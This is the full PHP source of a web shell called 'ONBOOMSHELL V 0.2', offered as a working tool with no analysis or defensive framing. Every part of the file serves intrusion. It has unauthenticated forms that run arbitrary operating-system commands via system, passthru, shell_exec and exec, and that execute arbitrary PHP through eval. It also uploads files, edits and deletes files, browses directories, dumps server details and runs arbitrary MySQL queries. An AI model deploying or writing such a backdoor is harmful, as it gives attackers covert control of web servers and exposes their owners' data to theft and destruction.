<?php

/*
ONBOOMSHELL V 0.2
by cobra90nj
contact: cobra90nj[at]gmail[dot]com
*/
error_reporting(0);
echo "DiskSpace ".disk_total_space(getcwd())." <br/>";
echo "DiskSpaceFree ".diskfreespace(getcwd())." <br/>";

   if (function_exists("mysql_connect")) {
      echo "My_SQL ON <br/>";
   }
   else {
      echo "My_SQL OFF <br/>";
   }
   if (function_exists("curl_version")) {
      echo "cURL ON <br/>";
   }
   else {
      echo "cURL OFF <br/>";
   }

echo "Magic_Quotes ".get_magic_quotes_gpc()." <br/>";
echo $_SERVER["HTTP_HOST"]." <br/>";
echo php_uname()." <br/>";
echo getenv("SERVER_SOFTWARE")." <br/>";
echo phpversion()." <br/>";
$diratt = realpath($_POST["dir"]);

echo "<br/><form action='' method='post'>
      <input type='text' method='post' name='dir' size='50' value='$diratt'>
      <input type='submit' value='Dir'>
      </form>";

echo "<br/><form enctype='multipart/form-data' method='POST'>
      <input type='file' name='file'>
      <input type='submit' name='send' value='   Send file   '></center>
      </form>";

echo "<form method='post'>
      <input type='text' name='comandexe' size='10'>
      <select name='command'>   
      <option value='system'>System</option>
      <option value='passthru'>Passthru</option>
      <option value='shell_exec'>Shell_exec</option>
      <option value='exec'>Exec</option>
      </select>
      <input type='submit' value='ExecuteCommand'>
      </form>";

echo form("eval", "eval", "Eval");
echo form("phpinfo", "phpinfo", "Phpinfo");
echo form("mysql", "mysql", "Mysql");

   if (isset($_POST["edit"])) {
         $filedir = $_POST["edit"];
         $filedit = file_get_contents($filedir);
         echo "<br/><form action='' method='post'>
                  <textarea cols='80' rows='20' name='savetest'>".htmlspecialchars($filedit)."</textarea><br/>
                 <font size='1'>File name:</font><input type='text' name='save' size='10' value='".$_POST["edit"]."'>
                  <input type='submit' value='Save'>
                           </form>";
   }

   if ($dirfile = opendir($diratt)) {
         while (false !== ($filedir = readdir($dirfile))) {
            $filesiz = sprintf("%01.2f", filesize("$diratt/$filedir")/1024);
            $groupid = posix_getpwuid(fileowner("$diratt/$filedir"));
                 $groupinfo = posix_getgrgid(filegroup("$diratt/$filedir"));
               $ow = $groupid[name] ." ". $groupinfo[name];
               $info = get_perms("$diratt/$filedir");
               if ($filedir != "." && $filedir != "..") {
                  if (is_file("$diratt/$filedir")) {
                     echo "<table border='1' width='60%'><tr><td>$filedir</td><td width='15%'>$ow</td><td width='20%'>$info</td><td width='15%'>$filesiz K</td></tr></table>";
                  }
                  else {
                     echo "<table border='1' width='60%'bgcolor='red'><tr><td>$filedir</td><td width='15%'>$ow</td><td width='35%'>$info</td></tr></table>";
                  }
               }
            }
      }

echo formsub("edit", "Edit");
echo formsub("delete", "Delete");
echo formsub("makefile", "Makefile");
echo formsub("makedir", "Makedir");

   if (isset($_POST["savetest"]) && isset($_POST["save"])) {
      $testnew = $_POST["savetest"];
      $filedir = $_POST["save"];
      $fail = fopen($filedir, "w+");
         fwrite($fail, $testnew);
         fclose($fail);
   }

$comand = $_POST["comandexe"];
$method = $_POST["command"];
   if (isset($comand) && isset($method)) {
      if ($method == "system") {
            echo system($comand);
      }
      else if ($method == "passthru") {
            echo passthru($comand);
      }
      else if ($method == "shell_exec") {
         shell_exec($comand);
      }
      else if ($method == "exec") {
            echo exec($comand);
      }
   }
   if (isset($_POST["delete"])) {
      $filedir = $_POST["delete"];
      echo "<form method='post' name='yes'><font size='1'>Delete file:</font>
               <input type='text' name='delete' size='10' value='".$_POST["delete"]."'>
              <input type='submit' name='yes' value='Yes' size='5'>
            </form>";
      if (isset($_POST["yes"]) && isset($_POST["delete"])) {
         chmod($filedir, 0777);
         unlink($filedir);
      }
   }

   if (isset($_POST["makefile"])) {
      $namefile = $_POST["makefile"];
      echo "<form method='post'>
            <textarea cols='80' rows='20' name='savetest'></textarea><br/>
                      <input type='text' name='delete' size='10' value='".$_POST["makefile"]."'>
                  <input type='submit' value='Make'>
                 </form>";
   }

   if (isset($_POST["savetest"])) {
      $testnew = $_POST["savetest"];
      $filedir = $_POST["makefile"];
      $fail = fopen($filedir, "w+");
         fwrite($fail, $testnew);
         fclose($fail);
   }

   if (isset($_POST["makedir"])) {
      $makedir = $_POST["makedir"];
         mkdir($makedir);
   }

$switch = $_POST["tools"];
   if ($_POST["send"]) {
      if (move_uploaded_file($_FILES["file"]["tmp_name"], $diratt."/".$_FILES["file"]["name"])) {
         unset($_FILES["file"]["tmp_name"]);
      }
   }

   switch ($switch) {
      case "phpinfo":
         phpinfo();
      break;
        case "eval":
         echo "<form method='post' name='evaltext'>
                 <textarea cols='80' rows='20' name='evaltext'></textarea><br/>
                 <input type='hidden' name='tools' value='eval'>
                 <input type='submit' value='Eval'>
                  </form>";
         if (isset($_POST["evaltext"])) {
            $evals = $_POST["evaltext"];
               eval($evals);
         }
         break;
         case "mysql":
         echo "<form method='post'>
                  <input type='text' name='name' value='name'><br/>
                  <input type='text' name='password' value='password'><br/>
                  <input type='text' name='namedb' value='nameDB'><br/>
                 <input type='text' name='query' value='query'><br/>
                 <input type='hidden' name='tools' value='mysql'>
               <input type='submit' value='SendQuery'>
               </from>";
         $name = $_POST["name"];
         $password = $_POST["password"];
         $namedb = $_POST["namedb"];
         $query = $_POST["query"];
            if (isset($name) && isset($password) && isset($namedb) && isset($query)) {
               $connect = mysql_connect("localhost", $name, $password);
               $databselect = mysql_select_db($namedb, $connect);
               $selquery = mysql_query($query, $connect);
                  while ($result = @mysql_fetch_array($selquery)) {
                        echo "$result[0]<br/>";
                  }
            }
      break;
   }   

   function formsub($valuefrist, $valuesecond)
   {
      $riturn = "<form method='post'>
                  <input type='text' name='$valuefrist' size='10'>
                  <input type='submit' value='$valuesecond'><br/>
                  </form>";
      return $riturn;
   }

   function form($name, $value, $nvalue)
   {
      $ret = "<form method='post' name='$name'>
               <input type='hidden' name='tools' value='$value'>
               <input type='submit' value='$nvalue'>
               </form>";
      return $ret;
   }

   function get_perms($filedir)   //PHP.net
   {
   $perms = @fileperms($filedir);
      if($perms==false)  return false;
   $info='';
   // Owner   
   $info .= (($perms & 0x0100) ? 'r' : '-');
   $info .= (($perms & 0x0080) ? 'w' : '-');
   $info .= (($perms & 0x0040) ?
       (($perms & 0x0800) ? 's' : 'x' ):
       (($perms & 0x0800) ? 'S' : '-'));
   // Group   
   $info .= (($perms & 0x0020) ? 'r' : '-');
   $info .= (($perms & 0x0010) ? 'w' : '-');
   $info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ):
              (($perms & 0x0400) ? 'S' : '-'));
   // World   
   $info .= (($perms & 0x0004) ? 'r' : '-');
   $info .= (($perms & 0x0002) ? 'w' : '-');
   $info .= (($perms & 0x0001) ?
              (($perms & 0x0200) ? 't' : 'x' ):
              (($perms & 0x0200) ? 'T' : '-'));
   return $info;
   }

?>